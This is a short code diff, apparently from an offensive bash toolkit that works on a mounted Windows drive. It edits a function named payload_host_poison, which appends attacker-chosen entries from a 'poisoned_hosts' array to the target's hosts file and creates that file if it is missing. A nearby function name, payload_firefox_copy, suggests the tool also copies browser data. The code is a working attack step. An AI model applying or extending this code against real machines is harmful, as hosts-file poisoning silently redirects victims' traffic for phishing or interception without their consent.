@@ -57,8 +57,9 @@ function payload_firefox_copy {
 
 function payload_host_poison {
     hostfile="/Windows/System32/drivers/etc/hosts"
+    if [ ! -f ${TARGET_MOUNT}${hostfile} ];then touch ${TARGET_MOUNT}${hostfile};fi 
     for entry in "${poisoned_hosts[@]}";do
-        echo "${entry}" >> "${hostfile}"
+        echo "${entry}" >> "${TARGET_MOUNT}${hostfile}"
     done
 }
 
